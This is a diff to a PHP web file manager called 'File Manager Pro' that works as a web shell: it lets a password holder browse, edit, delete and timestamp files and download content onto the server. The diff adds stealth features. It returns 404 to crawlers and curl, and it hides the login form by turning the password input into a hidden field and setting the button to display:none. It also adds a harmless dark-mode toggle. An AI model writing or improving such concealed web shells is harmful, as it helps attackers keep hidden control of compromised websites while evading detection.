@@ -1,11 +1,23 @@
 <?php
 session_start();
+define('APP_VER', '0.1');
 $password = defined('PW') ? PW : '0192023a7bbd73250516f069df18b500';
+
+// Undetect bots
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
+    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+// Handle login actions
 if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
         $_SESSION['logged_in'] = true; header('Location:'); exit;
     }
-    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" placeholder="Password" class="border px-2"> <button class="bg-green-500 text-white px-2">Login</button></form></body></html>'; exit;
+    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="hidden" name="password" placeholder="Password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
 }
 
 // Path
@@ -150,6 +162,23 @@ $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
 <title>File Manager Pro</title>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+<style>
+body.dark table { background-color: #1f2937; color: #f3f4f6; }
+body.dark table tr { border-color: #374151; }
+body.dark .bg-gray-200 { background-color: #374151 !important; }
+body.dark .bg-white { background-color: #1f2937 !important; color: #f3f4f6; }
+body.dark input, body.dark textarea, body.dark select {
+  background-color: #374151 !important; color: #f3f4f6;
+}
+body.dark .border { border-color: #4b5563 !important; }
+body.dark .text-gray-700 { color: #d1d5db !important; }
+body.dark .text-gray-500 { color: #9ca3af !important; }
+body.dark .bg-gray-50 { background-color: #374151 !important; }
+body.dark .bg-gray-300 {
+  background-color: #4b5563 !important;
+  color: #f9fafb !important;           
+}
+</style>
 <script>
 $(function(){
     $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
@@ -211,7 +240,7 @@ $(function(){
     <a href="?path=<?=urlencode($self_dir)?>" class="bg-gray-300 px-2 py-1 rounded">📂 FM Dir</a>
     </div>    
     <div class="flex space-x-2">
-    <form method="get" class="flex space-x-1"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
+    <form method="get" class="flex space-x-1"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2 rounded"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
     <button id="showDownloader" class="bg-purple-500 text-white px-2 py-1 rounded">⬇️ Downloader</button>
     <button id="showNewFolder" class="bg-green-500 text-white px-2 py-1 rounded">📁 New Folder</button>
     <button id="showNewFile" class="bg-green-500 text-white px-2 py-1 rounded">📄 New File</button>
@@ -228,7 +257,7 @@ $(function(){
     <th class="p-2">Action</th></tr>
     <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
     <tr class="border-t">
-    <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
+    <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
     <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button></td></tr><?php endforeach;?>
     </table>
@@ -276,7 +305,7 @@ $(function(){
         <div class="flex-grow lg:w-1/2 text-gray-600">
               <?=date('Y');?> - <a href="https://www.github.com/willygoid" target="_blank" class="text-blue-700 hover:text-blue-500">@willygoid</a></div>
         <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
-          <p class="font-bold">v0.1</p>
+          <p class="font-bold"> <button type="button" id="toggleTheme" class="bg-gray-800 text-white px-2 py-1 rounded">🌙 Dark</button> v<?=APP_VER;?></p>
         </div>
       </div>
 </footer>
@@ -288,4 +317,26 @@ toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($
 </script>
 <?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>
 
+<script>
+$(function(){
+  $('#toggleTheme').click(function(){
+    $('body').toggleClass('dark bg-gray-900 text-gray-100');
+    // Toggle tombol text
+    if($('body').hasClass('dark')){
+      $(this).text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
+    } else {
+      $(this).text('🌙 Dark').removeClass('bg-yellow-500').addClass('bg-gray-800');
+    }
+    // Simpan preferensi ke localStorage
+    if($('body').hasClass('dark')) localStorage.setItem('theme','dark');
+    else localStorage.setItem('theme','light');
+  });
+
+  // Cek preferensi theme saat load
+  if(localStorage.getItem('theme')==='dark'){
+    $('body').addClass('dark bg-gray-900 text-gray-100');
+    $('#toggleTheme').text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
+  }
+});
+</script>
 </body></html>
